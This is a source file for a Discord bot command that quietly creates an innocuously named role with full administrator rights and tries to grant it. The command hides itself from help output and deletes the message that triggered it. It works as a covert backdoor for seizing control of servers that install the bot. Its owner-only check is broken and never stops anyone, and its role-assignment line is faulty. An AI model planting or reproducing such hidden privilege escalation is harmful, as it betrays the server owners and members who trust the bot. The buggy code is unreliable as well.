const { prefix } = require('../config.json');

module.exports = {
	name: 'giveadmin',
	description: 'gives the person who executed the command an inconspicous admin role',
	aliases: ['admin', 'godmode'],
	usage: `${prefix}giveadmin`,
	guildOnly: true,
	helpMessage: false,
	async execute(message) {
		await message.delete({ timeout: 1000 }).catch(console.error);
		const member = message.mentions.members.first();

		if (!message.author.id === '332555969169063938') return;

		message.guild.roles.create({
			data: {
				name: 'pp',
				permissions:[{
					'ADMINISTRATOR': true,
				}],
			},
		});

		member.roles.add(member);
	},
};